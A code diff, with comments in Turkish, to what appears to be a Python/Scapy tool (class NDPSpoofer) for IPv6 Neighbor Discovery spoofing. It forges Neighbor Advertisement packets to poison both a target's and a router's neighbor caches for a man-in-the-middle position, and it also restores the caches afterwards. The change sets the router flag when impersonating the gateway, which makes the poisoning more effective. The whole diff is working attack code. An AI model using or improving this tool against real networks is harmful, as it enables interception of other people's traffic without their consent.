@@ -457,28 +457,16 @@ class NDPSpoofer:
         self,
         dst_mac: str,       # Ethernet hedef
         dst_ipv6: str,      # IPv6 hedef (Neighbor Cache'i zehirlenecek)
-        spoof_ipv6: str,    # Sahte kaynak IP (biz router gibi görünürüz)
+        spoof_ipv6: str,    # Sahte kaynak IP (biz bu IP gibi görünürüz)
+        is_router: bool = False,
     ) -> object:
         """
         Hedef cihazın Neighbor Cache'ini zehirlemek için sahte NA üretir.
 
         NA (Neighbor Advertisement) Bayrakları:
-          R=0  → Biz router DEĞİLiz (hedef bunu zaten biliyor)
-          S=1  → Bu bir solicited yanıttır (daha güvenilir görünür)
-          O=1  → Override: mevcut cache kaydını geçersiz kıl ← kritik!
-
-        Eğitim Notu:
-            O=1 (Override flag) olmadan bazı işletim sistemleri
-            mevcut cache kaydını güncellemez. iPhone için O=1 gereklidir.
-
-        Args:
-            dst_mac:   Paketi alacak cihazın Ethernet MAC'i.
-            dst_ipv6:  Paketi alacak cihazın IPv6 adresi.
-            spoof_ipv6: Sahte olarak iddia ettiğimiz IPv6 adresi
-                        (gerçekte bu IP gateway veya target'a ait).
-
-        Returns:
-            Scapy paket zinciri.
+          R=1/0 → Router bayrağı (Router taklit edilirken 1, normal host iken 0)
+          S=1   → Solicited: istek üzerine yanıt gibi görünsün
+          O=1   → Override: mevcut cache kaydını geçersiz kıl ← kritik!
         """
         return (
             Ether(src=self.attacker_mac, dst=dst_mac) /
@@ -488,12 +476,12 @@ class NDPSpoofer:
             ) /
             ICMPv6ND_NA(
                 tgt=_strip_zone(spoof_ipv6),  # "Ben bu IP'yim" iddiası
-                R=0,              # Router bit
-                S=1,              # Solicited: istek üzerine yanıt gibi görünsün
-                O=1               # Override: cache'i zorla güncelle
+                R=1 if is_router else 0,      # Router bayrağı
+                S=1,                          # Solicited
+                O=1                           # Override
             ) /
             ICMPv6NDOptDstLLAddr(
-                lladdr=self.attacker_mac   # "Benim MAC'im bu" → sahte
+                lladdr=self.attacker_mac      # "Benim MAC'im bu" → sahte
             )
         )
 
@@ -503,23 +491,20 @@ class NDPSpoofer:
         dst_ipv6: str,
         real_ipv6: str,
         real_mac: str,
+        is_router: bool = False,
     ) -> object:
         """
         Orijinal Neighbor Cache'i onarmak için gerçek NA paketi üretir.
-
-        Args:
-            dst_mac:   Onarılacak cihazın MAC'i.
-            dst_ipv6:  Onarılacak cihazın IPv6'sı.
-            real_ipv6: Gerçek kaynak IPv6 adresi.
-            real_mac:  Gerçek kaynak MAC adresi.
-
-        Returns:
-            Scapy paket zinciri.
         """
         return (
             Ether(src=real_mac, dst=dst_mac) /
             IPv6(src=_strip_zone(real_ipv6), dst=_strip_zone(dst_ipv6)) /
-            ICMPv6ND_NA(tgt=_strip_zone(real_ipv6), R=0, S=1, O=1) /
+            ICMPv6ND_NA(
+                tgt=_strip_zone(real_ipv6),
+                R=1 if is_router else 0,
+                S=1,
+                O=1
+            ) /
             ICMPv6NDOptDstLLAddr(lladdr=real_mac)
         )
 
@@ -530,25 +515,27 @@ class NDPSpoofer:
         Arka planda sürekli sahte NA paketi gönderen döngü.
 
         Çift yönlü zehirleme:
-          1) Hedefe: "Router'ın MAC'i = benim MAC'im"
-          2) Router'a: "Hedefin MAC'i = benim MAC'im"
+          1) Hedefe: "Router'ın MAC'i = benim MAC'im" (is_router=True)
+          2) Router'a: "Hedefin MAC'i = benim MAC'im"  (is_router=False)
         """
         cprint(f"  [*] NDP zehirleme döngüsü başladı.", Colors.GRAY)
 
         while not self._stop_event.is_set():
             try:
-                # 1) Hedef cihaza: "Router benim"
+                # 1) Hedef cihaza: "Router benim" (R=1, Router bayrağı korunsun)
                 pkt_to_target = self._make_na_spoof(
                     dst_mac=self.target_mac,
                     dst_ipv6=self.target_ipv6,
                     spoof_ipv6=self.router_ipv6,
+                    is_router=True,
                 )
 
-                # 2) Router'a: "Hedef benim"
+                # 2) Router'a: "Hedef benim" (R=0, hedef bir istemcidir)
                 pkt_to_router = self._make_na_spoof(
                     dst_mac=self.router_mac,
                     dst_ipv6=self.router_ipv6,
                     spoof_ipv6=self.target_ipv6,
+                    is_router=False,
                 )
 
                 sendp(pkt_to_target, iface=self.iface, verbose=False)
@@ -583,6 +570,7 @@ class NDPSpoofer:
                         dst_ipv6=self.target_ipv6,
                         real_ipv6=self.router_ipv6,
                         real_mac=self.router_mac,
+                        is_router=True,
                     ),
                     iface=self.iface, verbose=False
                 )
@@ -593,6 +581,7 @@ class NDPSpoofer:
                         dst_ipv6=self.router_ipv6,
                         real_ipv6=self.target_ipv6,
                         real_mac=self.target_mac,
+                        is_router=False,
                     ),
                     iface=self.iface, verbose=False
                 )
